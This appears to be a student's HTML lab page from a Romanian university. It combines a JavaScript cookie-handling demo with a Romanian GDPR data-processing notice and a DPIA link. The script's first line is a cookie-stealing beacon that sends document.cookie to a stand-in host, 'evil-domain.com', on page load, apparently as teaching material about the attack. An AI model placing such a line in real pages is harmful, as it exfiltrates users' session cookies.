<script> 
  (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
document.cookie = "name=oeschger";
document.cookie = "favorite_food=tripe";
function alertCookie() {
  alert(document.cookie);
} 
document.cookie = "test1=HELLO World";
document.cookie = "test2=Lab MDCP";

const cookieValue = document.cookie
  .split('; ')
  .find(row => row.startsWith('test2='))
  .split('=')[1];

function alertCookieValue() {
  alert(cookieValue);
}
function doOnce() {
  if (!document.cookie.split('; ').find(row => row.startsWith('doSomethingOnlyOnce'))) {
    alert("Do something here!");
    document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
  }
}
function resetOnce() {
  document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
}

//ES5

if (document.cookie.split(';').some(function(item) {
    return item.indexOf('reader=1') >= 0
})) {
    console.log('The cookie "reader" has "1" for value')
}

//ES2016

if (document.cookie.split(';').some((item) => item.includes('reader=1'))) {
    console.log('The cookie "reader" has "1" for value')
}
</script>
  <body>
  Bun venit pe pagina cu jucarii!<br>
  <button onclick="alertCookie()">Show cookies</button><br>
  <button onclick="alertCookieValue()">Show cookie value</button><br>
  <button onclick="doOnce()">Only do something once</button><br>
  <button onclick="resetOnce()">Reset only one cookie</button><br>
Negru Denisa
</body>

  <a href="https://didatec-my.sharepoint.com/:w:/r/personal/negru_va_denisa_utcluj_didatec_ro/_layouts/15/Doc.aspx?sourcedoc=%7B2E948193-BC37-4C82-A87C-E6A6A4840894%7D&file=Task2.docx&action=edit&mobileredirect=true&wdNewAndOpenCt=1622837745557&ct=1622837745557&wdPreviousSession=e200e115-397c-43f1-b585-e3eb3aa0a9c9&wdOrigin=OFFICECOM-WEB.MAIN.UPLOAD&cid=ae19853d-df19-4274-98ca-907ebdf4f284">Click to see DPIA </a>

<p>
  Universitatea Tehnică Cluj-Napoca, cu sediul in Cluj-Napoca, pe Strada Memorandumului 28, 400114, reprezentată legal prin Rector, Prof. univ. dr. ing. Vasile ŢOPA vă prelucrează datele cu caracter personal.
</p>
<p>
În art. 4 pct. 1 din Regulamentul nr. 679/2016 se găsește definiția datelor cu caracter personal care stipulează orice informații privind o persoană fizică identificată sau identificabilă („persoana vizată”); o persoană fizică identificabilă este o persoană care poate fi identificată, direct sau indirect, în special prin referire la un anumit element de identificare, cum ar fi: 
-	nume, prenume;
-	CNP;
-	Adresă;
-	E-mail;
-	IBAN;
-	Adeverință medicală.
</p>
<p>
Vă informăm că datorită temeiului legal aplicabil în România și a relației contractuale în care vă aflați cu Universitatea Tehnică din Cluj-Napoca, aceasta procesează pe perioada relațiilor contractuale următoarele categorii de informații personale care vă aparțin: date de identificare (certificat de naștere, carte de identitate, etc.); date financiare (număr de cont, venituri realizate la nivelul instituției, situații financiare personale, etc.); caracteristici personale (vârsta, locul nașterii, naționalitate, stare civilă, etc.) necesare pentru stabilirea de drepturi cuvenite;  opinii privind starea de sănătate, componența familiei (numărul de copii și date de identificare a acestora, stare civilă, etc. în baza cărora se fac justificările de calcul a unor drepturi cuvenite sau se stabilesc alte drepturi conform legilor și normativelor aplicabile pentru cei care optează sau solicită aceste drepturi); informații privind parcursul academic, calificările deținute, istoricul profesional, calitatea de membru în organizații profesionale, publicații, date de contact necesare pentru derularea curentă a activității educaționale și de cercetare specifice universității.
Menționăm ca reținerea datelor cu caracter personal în instituție are rolul de a putea furniza către titularul datelor, la cerere, informații privind perioada de școlarizare petrecută în cadrul instituției și după finalizarea acestei perioade de instruire și se supune suplimentar temeiului legal aplicabil în România furnizat de OM Nr. 657 / 24.11.2014 privind regimul actelor de studii în sistemul de învățământ superior cu completările ulterioare.
Datele deținute la nivelul sistemelor informatice din Universitatea Tehnică din Cluj-Napoca nu sunt comunicate unor terțe părți decât în cazul în care există solicitări venite conform unui temei legal furnizat de instituții ale statului român sau pentru îndeplinirea obligațiilor contractuale dintre dumneavoastră ca student / cursant și Universitatea Tehnică din Cluj-Napoca ca furnizor de servicii educaționale.
</p>
<p>
Conform Regulamentului UE nr. 679/2016 persoanele vizate beneficiază de următoarele drepturi:
</p>
<p>
•	dreptul de acces cu titlul gratuit la datele personale prelucrate de universitate;
</p>
<p>
•	dreptul la rectificare şi dreptul la ştergerea datelor – fără a contraveni obligaţiilor legale ale universităţii;
</p>
<p>
•	dreptul de restricţionare a prelucrării datelor – fără a contraveni obligaţiilor legale ale universităţii;
</p>
<p>
•	dreptul la portabilitatea datelor;
</p>
<p>
•	dreptul de a retrage oricând consimţământul în cazul în care prelucrarea se bazează pe consimţământ.
</p>
<p>
Perioada de stocare şi prelucrare a datelor cu caracter personal este determinată de prevederile legale în vigoare. La sfârşitul perioadei de stocare şi prelucrare a datelor cu caracter personal, conform raporturilor juridice sau scopurilor precizate în declarațiile de consimțământ completate de persoanele vizate, datele cu caracter personal vor fi şterse din procesele curente şi vor fi arhivate conform legislaţiei naţionale.
</p>
<p>
		    În cazul mobilității la o universitate din UK, instituția de primire trebuie să elibereze studentului foaia matricolă e confirmă parcurgerea programului de studii precum și rezultatele acestuia. Totodată, instituția de trimitere trebuie să acorde recunoaștere academică tuturor activităților finalizate în timpul mobilității conform contractului de studiu, prin acordarea creditelor transferabile sau a unui sistem echivalent.
</p>
<p>
		    Datorită faptului că perioada de mobilitate va fi inclusă și în suplimentul de diplomă, Universitatea Tehnică va avea dreptul să acceseze informațiile despre student din perioada mobilității.   
  
  </p>
  

